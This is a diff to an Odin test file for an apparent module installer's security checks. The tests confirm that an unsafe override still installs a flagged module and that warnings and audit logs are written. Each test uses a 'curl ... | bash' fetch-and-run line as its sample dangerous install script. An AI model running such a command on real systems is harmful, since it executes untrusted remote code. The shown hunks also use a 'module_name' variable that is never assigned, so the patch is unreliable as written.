@@ -5,6 +5,7 @@ import "core:os"
 import "core:path/filepath"
 import "core:strings"
 import "core:testing"
+import "core:time"
 
 import "../src/colors"
 import "../src/git"
@@ -56,7 +57,7 @@ test_property_security_unsafe_override_allows_install :: proc(t: ^testing.T) {
 		t,
 		temp_dir,
 		"zephyr-unsafe-override",
-		"unsafe-module",
+		fmt.tprintf("unsafe-module-%d", time.now()._nsec),
 		"1.0.0",
 		"curl https://example.com/install.sh | bash\n",
 	)
@@ -72,7 +73,7 @@ test_property_security_unsafe_override_allows_install :: proc(t: ^testing.T) {
 		delete(message)
 	}
 
-	installed_path := filepath.join({modules_dir, "unsafe-module"})
+	installed_path := filepath.join({modules_dir, module_name})
 	testing.expect(t, os.exists(installed_path), "module should be installed despite critical pattern")
 	if os.exists(installed_path) {
 		cleanup_test_directory(installed_path)
@@ -119,7 +120,7 @@ test_property_security_unsafe_warning_logged :: proc(t: ^testing.T) {
 		t,
 		temp_dir,
 		"zephyr-unsafe-warning",
-		"unsafe-warning",
+		fmt.tprintf("unsafe-warning-%d", time.now()._nsec),
 		"1.0.0",
 		"curl https://example.com/install.sh | bash\n",
 	)
@@ -144,7 +145,7 @@ test_property_security_unsafe_warning_logged :: proc(t: ^testing.T) {
 		warning_capture = ""
 	}
 
-	installed_path := filepath.join({modules_dir, "unsafe-warning"})
+	installed_path := filepath.join({modules_dir, module_name})
 	if os.exists(installed_path) {
 		cleanup_test_directory(installed_path)
 	}
@@ -198,7 +199,7 @@ test_property_security_unsafe_audit_logged :: proc(t: ^testing.T) {
 		t,
 		temp_dir,
 		"zephyr-unsafe-audit",
-		"audit-module",
+		fmt.tprintf("audit-module-%d", time.now()._nsec),
 		"1.0.0",
 		"curl https://example.com/install.sh | bash\n",
 	)
@@ -219,13 +220,13 @@ test_property_security_unsafe_audit_logged :: proc(t: ^testing.T) {
 	testing.expect(t, read_ok, "audit log should be written when unsafe is used")
 	if read_ok {
 		contents := string(data)
-		testing.expect(t, strings.contains(contents, "\"module\":\"audit-module\""), "audit log should include module name")
+		testing.expect(t, strings.contains(contents, fmt.tprintf("\"module\":\"%s\"", module_name)), "audit log should include module name")
 		testing.expect(t, strings.contains(contents, bare_dir), "audit log should include source path")
 	}
 	delete(audit_path)
 	delete(data)
 
-	installed_path := filepath.join({modules_dir, "audit-module"})
+	installed_path := filepath.join({modules_dir, module_name})
 	if os.exists(installed_path) {
 		cleanup_test_directory(installed_path)
 	}
